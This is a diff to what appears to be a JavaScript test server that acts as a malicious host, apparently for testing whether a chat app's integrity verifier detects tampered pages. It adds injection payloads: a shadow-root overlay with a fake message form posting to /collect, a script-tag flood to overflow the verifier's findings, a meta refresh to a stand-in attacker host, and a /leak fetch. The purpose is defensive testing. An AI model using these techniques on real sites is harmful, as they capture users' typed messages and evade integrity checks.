@@ -66,6 +66,8 @@ const TYPES = {
  *                            for a room that no longer exists
  *   gateway-error            answer navigations to the chat page the way a
  *                            reverse proxy does while the server restarts
+ *   own-csp                  send a Content-Security-Policy of the server's
+ *                            own with every document
  */
 const state = { mode: 'clean', log: [], serveManifest: true };
 
@@ -101,11 +103,41 @@ function injection(poc) {
         // of an image, which the policy lets the page load from the site.
         return DIRECTIVES;
     case 'handler': return HANDLER;
+    case 'flood-style':
+        // Enough blocked scripts to fill the verifier's list of findings,
+        // then the unsigned stylesheet that the list would have no room for.
+        return Array.from({ length: 250 }, (_, i) => `<script src="/static/js/flood-${i}.js"></script>`).join('')
+            + '<link rel="stylesheet" href="/static/css/evil.css">';
     default: return null;
     }
 }
 
 const DIRECTIVES = '<div x-data><img id="server-added" alt="" :src="$store.chatRoom.connectingMessage"></div>';
+
+/**
+ * A declarative shadow root on the body: the parser attaches it to the body
+ * itself, the page's own elements are shown through its slot, and what it
+ * holds is drawn above them. This one carries an unsigned stylesheet, a
+ * layer over the top of the page and a form over the bottom, where the
+ * message field of the chat is. Nothing in it is a script.
+ */
+const SHADOW_LAYER = (mode, unsigned) => `<template shadowrootmode="${mode}">`
+    + '<link rel="stylesheet" href="/static/css/style.css">'
+    + (unsigned ? '<link rel="stylesheet" href="/static/css/shadow.css">' : '')
+    + '<slot></slot><div id="fake-layer">served layer</div>'
+    + '<form id="fake-composer" method="post" action="/collect">'
+    + '<input name="m" placeholder="Type a message..." autocomplete="off"><button>Send</button></form>'
+    + '</template>';
+
+const SHADOW_CSS = `:host { outline: 9px solid rgb(255, 0, 0) !important; }
+#fake-layer { position: fixed; top: 0; left: 0; right: 0; height: 120px; z-index: 2147483647;
+    background: rgb(1, 2, 3); display: block !important; }
+#fake-composer { position: fixed; left: 0; right: 0; bottom: 0; height: 72px; z-index: 2147483647;
+    display: flex !important; background: rgb(1, 2, 3); }
+#fake-composer input { flex: 1; height: 60px; font-size: 16px; }`;
+
+/** An unsigned script, for a page served under the server's own policy. */
+const UNSIGNED_SCRIPT = "fetch('/leak?fragment=unsigned-script-ran');";
 
 /**
  * Other ways of serving the same directives, each a way a framework that
@@ -133,6 +165,31 @@ function rearranged(html, poc) {
         return html.replace(tag[0], '')
             .replace('</body>', `${DIRECTIVES}${tag[0].replace('></script>', ' defer></script>')}\n</body>`);
     }
+    case 'shadow-closed':
+        // Closed: no script of the page can even see it.
+        return html.replace(/(<body[^>]*>)/, `$1${SHADOW_LAYER('closed', true)}`);
+    case 'shadow-signed':
+        // Open, so that the test can see it, and with signed styles only.
+        return html.replace(/(<body[^>]*>)/, `$1${SHADOW_LAYER('open', false)}`);
+    case 'name-body':
+        // An element named "body" stands in for document.body.
+        return html.replace(/(<body[^>]*>)/, '$1<p id="server-added">added by the server</p>')
+            .replace('</body>', '<img name="body" alt=""></body>');
+    case 'no-engine-form': {
+        // The framework left out, so nothing removes served markup, and a
+        // form that posts to the server.
+        const tag = /\n\s*<script src="\/static\/js\/alpine-csp\.min\.js"[^>]*><\/script>/.exec(html);
+        if (!tag) return null;
+        return html.replace(tag[0], '').replace(/(<body[^>]*>)/, '$1<form id="server-added" method="post" '
+            + 'action="/collect"><input name="m" autofocus autocomplete="off"><button>Send</button></form>');
+    }
+    case 'meta-refresh':
+        // Not a redirect: the document itself asks to load another address.
+        return html.replace('</head>', '<meta http-equiv="refresh" content="0;url=https://attacker.test/collect"></head>');
+    case 'own-script':
+        // An unsigned script of the site's own, which only a policy that
+        // trusts the origin runs.
+        return html.replace('</head>', '<script src="/static/js/unsigned.js"></script></head>');
     default: return null;
     }
 }
@@ -235,6 +292,17 @@ function handleSite(req, res, url) {
     }
     if (url.pathname === '/static/hop1') return send(res, 302, { location: '/static/hop2' }, '');
     if (url.pathname === '/static/hop2') return send(res, 307, { location: REDIRECTS.cross() }, '');
+    if (url.pathname === '/collect' && req.method === 'POST') {
+        // A served form that posts what was typed into it.
+        const entry = state.log[state.log.length - 1];
+        let body = '';
+        req.on('data', (chunk) => { body += chunk; });
+        req.on('end', () => {
+            entry.note = `collect ${decodeURIComponent(body.replace(/\+/g, ' ')).slice(0, 200)}`;
+            send(res, 204, {}, '');
+        });
+        return undefined;
+    }
     if (url.pathname === '/collect') {
         // Same host on another port: still attacker-controlled.
         return send(res, 200, { 'content-type': 'text/html; charset=utf-8' }, COLLECT_PAGE);
@@ -251,6 +319,12 @@ function handleSite(req, res, url) {
     }
     if (url.pathname === '/static/css/evil.css') {
         return send(res, 200, { 'content-type': 'text/css' }, 'html { outline: 9px solid rgb(255, 0, 0); }');
+    }
+    if (url.pathname === '/static/css/shadow.css') {
+        return send(res, 200, { 'content-type': 'text/css' }, SHADOW_CSS);
+    }
+    if (url.pathname === '/static/js/unsigned.js') {
+        return send(res, 200, { 'content-type': 'text/javascript' }, UNSIGNED_SCRIPT);
     }
     if (!url.pathname.startsWith('/static/')) return send(res, 404, {}, '');
     if (state.mode === 'gateway-error' && navigation && url.pathname === '/static/chat.html') {
@@ -283,6 +357,11 @@ function handleSite(req, res, url) {
     }
     if (isDocument && navigation && state.mode === 'cacheable') {
         headers['cache-control'] = 'public, max-age=600';
+    }
+    if (isDocument && state.mode === 'own-csp') {
+        // A policy of the server's own. It blocks inline handlers just like
+        // the packaged one, but trusts every script of the origin.
+        headers['content-security-policy'] = "script-src 'self'; style-src 'self'; default-src 'self'";
     }
     return send(res, 200, headers, body);
 }
